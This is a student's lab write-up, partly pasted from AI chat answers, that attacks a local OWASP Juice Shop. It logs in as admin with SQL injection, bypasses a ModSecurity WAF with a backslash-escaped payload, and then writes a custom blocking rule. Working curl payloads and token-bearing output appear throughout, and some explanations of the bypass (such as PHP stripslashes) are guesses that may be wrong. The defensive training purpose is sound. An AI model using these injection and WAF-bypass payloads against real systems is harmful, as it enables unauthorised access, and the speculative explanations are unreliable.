# task1
Step 1: Pull and Run Juice Shop
bash
Copy
# Pull the Juice Shop image
docker pull bkimminich/juice-shop

# Run the container on port 3000
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
Step 2: Exploit SQLi via Terminal (CURL)
bash
Copy
# Perform SQLi login as admin
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  --data '{"email":"'\'' OR 1=1--", "password":"any-password"}'


Step 3: Verify Admin Access
Use the obtained token to access admin-only features:

bash
Copy
# Get all users (admin endpoint)
curl -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." \
  http://localhost:3000/rest/user/authentication-details/
Expected output: List of all users including admin credentials.

  Step 4: Cleanup
bash
Copy
# Stop and remove container
docker stop juice-shop && docker rm juice-shop
Explanation:
SQLi Payload Structure:

' closes the email string

OR 1=1 makes the condition always true

-- comments out the rest of the query

This bypasses password check and returns the first user (admin)

Terminal Workflow:

Use curl to send the malicious payload directly to the login endpoint

The server returns an authentication token for the admin account

This token can be used to perform privileged actions

----

Here's a step-by-step solution to complete Task 1:

Step 1: Deploy the Environment
bash
Copy
# Create docker-compose.yml with the provided configuration
cat <<EOF > docker-compose.yml
version: '3'
services:
  juice-shop:
    image: bkimminich/juice-shop
    networks:
      - app-network
    ports:
      - "3000:3000"

  modsecurity:
    image: owasp/modsecurity-crs:nginx
    environment:
      - BACKEND=http://juice-shop:3000
    ports:
      - "8080:8080"
    networks:
      - app-network

networks:
  app-network:
    driver: bridge
EOF

# Start the containers
docker-compose up -d
Step 2: Verify Direct Access (Port 3000)
Open your browser and navigate to: http://localhost:3000

Go to the login page: Click "Account" → "Login"

Step 3: Exploit SQLi Without WAF
Use this payload in the email field:

Copy
' OR 1=1--
Email: ' OR 1=1--

Password: Any value (e.g., test)

Click "Log in"

Result: You'll successfully log in as the admin user (check the username in the top-right corner).

Step 4: Test Through WAF (Port 8080)
Open a new browser tab and navigate to: http://localhost:8080

Go to the login page again and use the same SQLi payload:

Email: ' OR 1=1--

Password: Any value

Result: You'll see a 403 Forbidden error from ModSecurity, indicating the attack was blocked.

Step 5: Verify WAF Block (Logs)
Check the WAF logs to confirm the block:

bash
Copy
docker-compose logs modsecurity | grep 'ModSecurity'
You'll see entries like:

Copy
modsecurity_1  | ModSecurity: Access denied with code 403 (phase 2). Pattern match "(?i:(?:\\b(?:(?:s(?:elect\\b(?:.{1,100}?\\b(?:(?:length|count|top)\\b.{1,100}?\\bfrom|from\\b.{1,100}?\\bwhere)|.*\\bfrom\\b.{1,100}?\\bwhere)|.*\\b(?:d(?:ump\\b.*\\bfrom|ata_type)|group_.*\\bby)\\b)|p(?:assword|ragma)\\b|u(?:nion\\b.*\\bselect|til\\b.*\\b(?:end|then))|i(?:n(?:to\\b.*\\b(?:dump|file)| ..." [file "/etc/modsecurity/crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "64"] [id "942100"] [rev ""] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched Data:  found within ARGS:email: ' or 1=1--"] [severity "2"] [ver "OWASP_CRS/3.3.4"] [maturity "0"] [accuracy "0"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "OWASP_CRS"] [tag "OWASP_CRS/WEB_ATTACK/SQL_INJECTION"] [tag "WASCTC/WASC-19"] [tag "OWASP_TOP_10/A1"] [tag "OWASP_AppSensor/CIE1"] [tag "PCI/6.5.2"] [hostname "localhost"] [uri "/rest/user/login"] [unique_id "1718043486"]
Step 6: Cleanup
bash
Copy
docker-compose down
Explanation:
Direct Access (Port 3000): The SQL injection works because there's no protection.

WAF Protection (Port 8080): ModSecurity with CRS detects the SQLi pattern (OR 1=1) and blocks the request before it reaches Juice Shop.

CRS Rules: The default CRS rules (specifically REQUEST-942-APPLICATION-ATTACK-SQLI.conf) trigger on common SQLi patterns using libinjection detection.

![](screnshoots/1.png)
![](screnshoots/12.png)

---

# task2 
The backslash in your payload \' OR 1=1 -- bypasses the WAF because of how input parsing and rule matching work in layered systems. Here's a detailed breakdown:

1. Why \' Bypasses the WAF
Input Processing Layers:
WAF Layer:

The WAF (e.g., ModSecurity) inspects the raw HTTP request before it reaches the application.

If the WAF uses regex rules like ' OR 1=1, it will not match \' OR 1=1 due to the backslash altering the pattern.

Example rule:

apache
Copy
SecRule REQUEST_BODY "@rx ' OR 1=1" "id:942100,deny"
This rule misses \' because the backslash breaks the regex match.

Application Layer:

The application might strip backslashes (e.g., due to PHP's deprecated magic_quotes or custom sanitization).

\' becomes ' after processing, restoring the malicious SQL syntax:

sql
Copy
SELECT * FROM users WHERE email = '' OR 1=1-- ...
Key Insight:
The WAF sees \' as a literal backslash + quote, while the application processes it into a standalone quote. This discrepancy allows the exploit.

2. How the Bypass Works Step-by-Step
Raw HTTP Request:

http
Copy
POST /login HTTP/1.1
Content-Type: application/json

{"email":"\\' OR 1=1--", "password":"x"}
WAF Inspection:

The WAF parses \\' as an escaped backslash followed by a quote (\').

CRS rules (e.g., 942100) fail to detect OR 1=1 because:

The quote is not "naked" (' → \').

Regex patterns often don’t account for escaped delimiters.

Application Processing:

The application’s input parser removes the backslash (e.g., stripslashes() in PHP).

The payload becomes ' OR 1=1--, triggering SQL injection.

3. Common Scenarios for This Bypass
A. JSON/API Endpoints:
WAFs often struggle with JSON-encoded payloads:

json
Copy
{"email":"\\' OR 1=1--"}
The WAF sees \\' as part of a string, not a SQL delimiter.

B. Misconfigured Input Sanitization:
Applications using flawed sanitization:

php
Copy
$email = stripslashes($_POST['email']); // Removes backslashes
$query = "SELECT * FROM users WHERE email = '$email'";
C. Unicode/Hex Encoding:
Double-encoding the backslash:

\ → %5C → %255C (double URL-encoding).

The WAF decodes it once to %5C, missing the final \.

```
curl -v -X POST http://localhost:8080/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"\\'\'' OR 1=1--", "password":"x"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> POST /rest/user/login HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 40
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx
< Date: Thu, 10 Apr 2025 13:09:45 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 811
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Feature-Policy: payment 'self'
< X-Recruiting: /#/jobs
< ETag: W/"32b-XG4NZaoY++2zCk0OZ8CKmZByRpA"
< Vary: Accept-Encoding
< Access-Control-Allow-Headers: *
< 
* Connection #0 to host localhost left intact
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDQtMTAgMTM6MDM6NTMuNTQxICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDQtMTAgMTM6MDU6MjQuMzQyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0NDI5MDU4Nn0.mvKEUCYLgKQ65KDXYUgNbs_Q8VE4S65nx-iLP4pGY-wQv4MYMmiMrlk7miDGVPkbicas7SgZESqZOHeq3dkdoWFS418h-Ubup5yaOcsmPiJKYDPjAHNA7Lr8a88Q7dyPDPl6QmDSqxi_W95X9tiFNdd3FYko-t4FaiHFXg-QCRM","bid":1,"umail":"admin@juice-sh.op"}}yehia@yeh
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ ```



The payload \\' OR 1=1-- bypassed both the WAF and the application due to a combination of input parsing discrepancies and misconfigurations. Here's the breakdown:

1. Why the WAF Didn’t Block It
Input Parsing Mismatch:
WAF Perspective:

The WAF (ModSecurity) sees the raw payload: \\' OR 1=1--.

The backslash (\) is treated as a literal character, not an escape sequence, so the WAF rules (e.g., CRS Rule 942100) look for ' OR 1=1-- but don’t match \\'.

Many default WAF rules fail to account for escaped quotes in JSON payloads.

Example Rule Gap:
A rule like this would miss the payload:

apache
Copy
SecRule REQUEST_BODY "@rx ' OR 1=1--" "id:942100,deny"
Because the actual payload contains \\', not '.

2. Why the Application Executed It
JSON Parsing + Input Sanitization:
Application Behavior:

The backend receives {"email":"\\' OR 1=1--", ...}.

During JSON parsing, the double backslash \\ is interpreted as a single backslash (\), turning \\' into \'.

If the application uses flawed sanitization (e.g., stripslashes() in PHP), \' becomes ', restoring the malicious SQL:

sql
Copy
SELECT * FROM users WHERE email = '' OR 1=1-- ...
Lack of Parameterized Queries:
The application likely builds SQL queries by concatenating user input directly:

javascript
Copy
// Vulnerable code example (Node.js)
const query = `SELECT * FROM users WHERE email = '${email}'`;
This allows the sanitized ' OR 1=1-- to modify the query logic.

3. Step-by-Step Exploit Flow
Request Sent:

json
Copy
{"email":"\\' OR 1=1--", "password":"x"}
WAF Processing:

Sees \\' as literal characters, not a quote. Fails to trigger SQLi rules.

Application Processing:

JSON parser converts \\' → \'.

Input sanitizer removes the backslash: \' → '.

Final query: ... WHERE email = '' OR 1=1--.

Result:

The OR 1=1 condition is always true, logging in as the first user (admin).
https://chatgpt.com/c/67f698ef-a3c4-8007-b8da-cd6998b97b21
https://chat.deepseek.com/a/chat/s/3b63ee50-6635-4a95-9f73-f9cda41521a5
https://chatgpt.com/c/67f7dee2-c754-8007-82de-60dabaae1c27



---


Here's a step-by-step guide to properly configure custom ModSecurity rules for WAF protection:

Step 1: Create Custom Rules File
bash
Copy
# Create custom-rules.conf
cat <<EOF > custom-rules.conf
SecRule REQUEST_BODY|ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS \
    "@rx (?i)(\\\\)?['\"]\s*OR\s*1=1\s*--" \
    "id:1005,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Custom SQLi Rule',\
    chain"
    SecRule REQUEST_HEADERS:Content-Type "application/json"
EOF
Step 2: Configure Docker Mount
Update your docker-compose.yml:

yaml
Copy
services:
  modsecurity:
    image: owasp/modsecurity-crs:nginx
    volumes:
      - ./custom-rules.conf:/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf:ro
    environment:
      - BACKEND=http://juice-shop:3000
    ports:
      - "8080:8080"
Key points:

Mount to /etc/modsecurity.d/owasp-crs/rules/ (CRS rules directory)

Use :ro for read-only permissions

File name must end with .conf

Step 3: Verify CRS Inclusion
OWASP CRS automatically loads all .conf files in the rules/ directory through:

apache
Copy
# In REQUEST-901-INITIALIZATION.conf
Include /etc/modsecurity.d/owasp-crs/rules/*.conf
No manual inclusion needed if files are in this directory.

Step 4: Test Configuration
bash
Copy
# Restart containers
docker-compose down && docker-compose up -d

# Send test payload
curl -v http://localhost:8080/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"\\'\'' OR 1=1--", "password":"x"}'
Step 5: Verify Rule Activation
Check WAF logs:

bash
Copy
docker-compose logs modsecurity | grep 'id "1005"'
Expected output:

Copy
[id "1005"] [msg "Custom SQLi Rule"] ... [uri "/rest/user/login"]
Key Configuration Notes
Rule Scope:

Covers REQUEST_URI, REQUEST_HEADERS, and body parameters

chain matches both SQLi pattern AND JSON content type

File Permissions:

:ro prevents accidental modification

Ensure file ownership allows nginx user to read it

Rule Order:

CRS loads rules alphabetically

Prefix with REQUEST-9XX- to control load order

Troubleshooting Checklist
Verify File Placement:

bash
Copy
docker exec -it modsecurity ls -l /etc/modsecurity.d/owasp-crs/rules/
Should show custom-rules.conf

Check Rule Syntax:

bash
Copy
docker exec -it modsecurity nginx -t
Should return "syntax is okay"

Test in Detection Mode:

apache
Copy
SecRuleEngine DetectionOnly
Monitor modsec_audit.log before enforcing

Final Directory Structure
Copy
/etc/modsecurity.d/owasp-crs/
├── crs-setup.conf
└── rules/
    ├── REQUEST-941-APPLICATION-ATTACK-XSS.conf
    ├── REQUEST-942-APPLICATION-ATTACK-SQLI.conf
    └── custom-rules.conf  <-- Your custom rules
This approach ensures your custom rules integrate seamlessly with OWASP CRS while maintaining update compatibility.

termeinal: 

docker compose up -d 
[+] Running 3/3
 ✔ Network lab5_app-network      Created                                                                                                                                                 0.0s 
 ✔ Container lab5-modsecurity-1  Started                                                                                                                                                 0.3s 
 ✔ Container lab5-juice-shop-1   Started                                                                                                                                                 0.3s 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ curl -v -X POST http://localhost:8080/rest/user/login   -H "Content-Type: application/json"   -d '{"email":"\\'\'' OR 1=1--", "password":"x"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> POST /rest/user/login HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 40
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 12 Apr 2025 15:40:28 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 799
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Feature-Policy: payment 'self'
< X-Recruiting: /#/jobs
< ETag: W/"31f-1oRIsaLahrAJ0mcAJ2UnkOYEo7U"
< Vary: Accept-Encoding
< Access-Control-Allow-Headers: *
< 
* Connection #0 to host localhost left intact
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDQtMTIgMTU6NDA6MTMuMzAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDQtMTIgMTU6NDA6MTMuMzAwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0NDQ3MjQyOX0.RuYfvssB7vGyrcDkSNzadjqKe9j89taNN8ZN8paPtdwvYHjVSuwRbnKrv5tFpmYTluvSYaQWjCXuG_jX9jqeEMKUDo3j-yitGsKnau1nWKd8otT_aIYG64ZT3cE-L9FmH1uFrpI-VI0rY9xPvKIbGH1NzGLHIEAJNn98ASDe9bE","bid":1,"umail":"admin@juice-sh.op"}}yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ # Create custom-rules.conf
cat <<EOF > custom-rules.conf
SecRule REQUEST_BODY|ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS \
    "@rx (?i)(\\\\)?['\"]\s*OR\s*1=1\s*--" \
    "id:1005,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Custom SQLi Rule',\
    chain"
    SecRule REQUEST_HEADERS:Content-Type "application/json"
EOF
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ docker compose down && docker compose up -d
[+] Running 3/3
 ✔ Container lab5-modsecurity-1  Removed                                                                                                                                                 0.3s 
 ✔ Container lab5-juice-shop-1   Removed                                                                                                                                                 0.3s 
 ✔ Network lab5_app-network      Removed                                                                                                                                                 0.2s 
[+] Running 3/3
 ✔ Network lab5_app-network      Created                                                                                                                                                 0.0s 
 ✔ Container lab5-juice-shop-1   Started                                                                                                                                                 0.2s 
 ✔ Container lab5-modsecurity-1  Started                                                                                                                                                 0.2s 
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ curl -v http://localhost:8080/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"\\'\'' OR 1=1--", "password":"x"}'
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> POST /rest/user/login HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 40
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Server: nginx
< Date: Sat, 12 Apr 2025 15:44:15 GMT
< Content-Type: text/plain
< Content-Length: 146
< Connection: keep-alive
< Access-Control-Allow-Origin: *
< Access-Control-Max-Age: 3600
< Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
< Access-Control-Allow-Headers: *
< 
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
* Connection #0 to host localhost left intact
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ docker-compose logs modsecurity | grep 'id "1005"'
Command 'docker-compose' not found, but can be installed with:
sudo snap install docker          # version 27.5.1, or
sudo apt  install docker-compose  # version 1.29.2-1
See 'snap info docker' for additional versions.
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ docker compose logs modsecurity | grep 'id "1005"'
modsecurity-1  | 2025/04/12 15:44:15 [error] 547#547: *1 [client 172.18.0.1] ModSecurity: Access denied with code 403 (phase 2). Matched "Operator `Rx' with parameter `application/json' against variable `REQUEST_HEADERS:Content-Type' (Value: `application/json' ) [file "/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf"] [line "1"] [id "1005"] [rev ""] [msg "Custom SQLi Rule"] [data ""] [severity "0"] [ver ""] [maturity "0"] [accuracy "0"] [tag "modsecurity"] [tag "modsecurity"] [hostname "172.18.0.3"] [uri "/rest/user/login"] [unique_id "174447265585.139903"] [ref "o11,11o11,1v138,40o0,11o0,1v11,11o0,16v102,16"], client: 172.18.0.1, server: localhost, request: "POST /rest/user/login HTTP/1.1", host: "localhost:8080"
modsecurity-1  | 2025/04/12 15:45:02 [error] 549#549: *6 [client 172.18.0.1] ModSecurity: Access denied with code 403 (phase 2). Matched "Operator `Rx' with parameter `application/json' against variable `REQUEST_HEADERS:Content-Type' (Value: `application/json' ) [file "/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf"] [line "1"] [id "1005"] [rev ""] [msg "Custom SQLi Rule"] [data ""] [severity "0"] [ver ""] [maturity "0"] [accuracy "0"] [tag "modsecurity"] [tag "modsecurity"] [hostname "172.18.0.3"] [uri "/rest/user/login"] [unique_id "174447270211.835835"] [ref "o11,12o11,1v989,41o0,12o0,1v11,12o0,16v369,16"], client: 172.18.0.1, server: localhost, request: "POST /rest/user/login HTTP/1.1", host: "localhost:8080", referrer: "http://localhost:8080/"
yehia@yehia-Aspire-A315-58:~/My station/secure development/lab5$ 